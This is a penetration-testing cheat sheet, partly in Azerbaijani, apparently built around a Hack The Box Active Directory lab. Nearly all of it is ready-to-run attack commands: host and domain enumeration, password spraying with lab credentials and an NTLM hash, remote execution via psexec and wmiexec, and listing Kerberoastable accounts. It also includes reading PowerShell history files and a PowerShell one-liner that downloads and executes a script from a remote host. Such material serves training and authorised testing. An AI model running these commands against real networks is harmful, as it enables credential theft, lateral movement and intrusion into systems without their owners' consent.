# Penetration Testing all step

## Command Syntaxis
```
https://wadcoms.github.io/
```
---

### Host Reconnaissance and Network Enumeration

```
# Find Active Hosts
sudo nmap -sn -n --max-retries 1 --max-rate 10 --data-length 24 192.168.1.0/24

# Specific Host
nmap -p- -Pn -T4 --min-rate 2000 --stats-every 50 --max-retries 2 10.10.10.10 ( Fast Scan )
```

### Service Enumeration
[Service Enumeration üçün bu fayllara bax](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Services)

### Vulnerability Scanner
[Servislərə özəl zəiflikləri axtarmaq üçün](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Services/Services-Attacks)

### Credentials
[Username və Password tapılması üçün](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/Enumeration/Username_Password-Enumeration.md)



# Active Directory Enumeration

### LLMNR/mDNS/NB-NS Poisining
[LLMNR/mDNS/NB-NS Poisoning Faylına Get](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)

### Password Policy
```
1) crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

2) rpcclient -U "" -N 172.16.5.5
getdompwinfo

3) enum4linux -P 172.16.5.5

4) ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

5) C:\htb> net accounts

6) import-module .\PowerView.ps1
Get-DomainPolicy
```

### Enumerate Username
```
https://github.com/insidetrust/statistically-likely-usernames
https://github.com/initstring/linkedin2username

NTLM Relay or Responder

enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

rpcclient -U "" -N 172.16.5.5
enumdomusers

crackmapexec smb 172.16.5.5 --users

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

```

### Password Spraying
```
# Linux
for u in $(cat wordlist.txt);do rpcclient -U "username%password" -c "getusername;quit" 172.16.5.5 | grep Authority; done

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +


# Windows
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

## Credentialed Enumeration
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

rpcclient -U "" -N 172.16.5.5
enumdomusers
user:[administrator] rid:[0x1f4]
queryuser 0x1f4

https://github.com/fortra/impacket/blob/master/examples/wmiexec.py
https://github.com/fortra/impacket/blob/master/examples/psexec.py
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5

https://github.com/ropnop/windapsearch
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

https://github.com/dirkjanm/BloodHound.py
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

### Credential Enumeration - From Windows
```
# Active Directory Module

Import-Module ActiveDirectory
Get-ADDomain

# User & Group
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select Name

# SPN Users List
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,ServicePrincipalNames | 
Where-Object {$_.ServicePrincipalName -match "HTTP/|MSSQL/|CIFS/"} | 
Select Name, ServicePrincipalName

# Kerberoastable Users
Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and ServicePrincipalNames -like "*/*"} -Properties ServicePrincipalName,ServicePrincipalNames | Select Name, ServicePrincipalName | Sort Name

Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"

# PoverView
## Special User
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Local Admin
Get-NetLocalGroupMember -ComputerName TARGETHOST -GroupName "Administrators"

# Deactive Account
Get-DomainUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"

Get-DomainGroupMember -Identity "Domain Admins" -Recurse

Get-DomainTrustMapping

Test-AdminAccess -ComputerName ACADEMY-EA-MS01

Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# Snaffler

.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data -o result_snaffler.txt
```

### Living off the Land
```
hostname
Get-Host
powershell.exe -version 2
[System.Environment]::OSVersion.Version
wmic qfe get Caption,Description,HotFixID,InstalledOn
ipconfig /all
set
echo %USERDOMAIN%
echo %logonserver%
Systeminfo

Get-Module
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process ( script restriction-u deaktiv )
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/PowerView.ps1'); ..." (

netsh advfirewall show allprofiles
sc query windefend
Get-MpComputerStatus
qwinsta
```

### AS-REP Roasting
[Pre-Auth bağlı userləri tapıb hash çəkmək](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/AS-REP_Roasting.md)

### LAPS Dumping
[LAPS vasitəsilə istifadəçilərin şifrələrini ələ keçirmək](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD%20Guides/LAPS%20Dumping.md)
